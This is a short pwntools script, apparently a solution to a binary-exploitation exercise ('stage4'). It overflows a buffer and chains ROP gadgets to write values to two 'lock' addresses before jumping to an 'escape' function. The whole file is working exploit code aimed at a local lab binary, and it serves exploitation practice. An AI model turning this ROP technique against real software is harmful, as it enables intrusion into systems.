import sys
from pwn import process, context, p64, ELF
import time
import re

target = './stage4'
context.binary = ELF(target, checksec=False)


p = process(target)
io = p

# Receive output from program and print it in ASCII
output = io.recv()
print(output.decode('ascii'))

############### YOUR INPUT HERE ####################
input = b'a'*0x28

#lock1
input+=p64(0x0000000000401a5b)  # gadget2 (pop rcx)
input+=p64(0x0000000000405060)  # lock1 addr
input+=p64(0x0000000000401a57)  # gadget1 (pop rax)
input+=p64(0x90b8ab019d5725a7)  # lock1 val
input+=p64(0x0000000000401a5f)  # gadget3 (mov [rcx] rax)

#lock2
input+=p64(0x0000000000401a5b)  # gadget2 (pop rcx)
input+=p64(0x0000000000405058)  # lock2 addr
input+=p64(0x0000000000401a57)  # gadget1 (pop rax)
input+=p64(0xacaa5d9177dade6f)  # lock2 val
input+=p64(0x0000000000401a5f)  # gadget3 (mov [rcx] rax)

input+=p64(0x0000000000401a65)  # escape

# ???
input+=p64(0x0000000000401b96)
input+=p64(0x0000000000401b96)
input+=p64(0x0000000000401b96)
input+=p64(0x0000000000401b96)
input+=p64(0x0000000000401b96)
input+=p64(0x0000000000401b96)
input+=p64(0x0000000000401b96)
input+=p64(0x0000000000401b96)
input+=p64(0x0000000000401b96)
input+=p64(0x0000000000401b96)


####################################################

# Send input to program
io.sendline(input)

# Get output
output = io.recv()
print(output.decode('ascii'))

